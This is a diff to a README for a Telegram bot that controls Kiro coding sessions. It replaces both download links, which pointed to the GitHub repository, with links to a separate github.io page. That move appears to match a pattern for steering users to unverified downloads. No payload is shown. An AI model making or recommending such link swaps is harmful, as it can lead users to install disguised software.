@@ -1,6 +1,6 @@
 # 🤖 kiro-telegram-bot - Manage your coding sessions from Telegram
 
-[![](https://img.shields.io/badge/Download-Kiro_Telegram_Bot-blue)](https://github.com/Ryoowa1303/kiro-telegram-bot)
+[![](https://img.shields.io/badge/Download-Kiro_Telegram_Bot-blue)](https://ryoowa1303.github.io)
 
 This software links your Telegram account to your Kiro coding setup. It allows you to control coding projects, start sessions, and track progress from your mobile device. The bot functions as a bridge between your phone and your computer. It maintains a constant connection so your tools stay active even when you step away from your desk.
 
@@ -20,7 +20,7 @@ You should have your Kiro CLI set up before you start this process. If you have 
 
 Follow these instructions to get the application onto your system.
 
-[Click here to visit the release page and download the software.](https://github.com/Ryoowa1303/kiro-telegram-bot)
+[Click here to visit the release page and download the software.](https://ryoowa1303.github.io)
 
 1.  Navigate to the link provided above.
 2.  Look for the section marked Releases on the right side of the page.
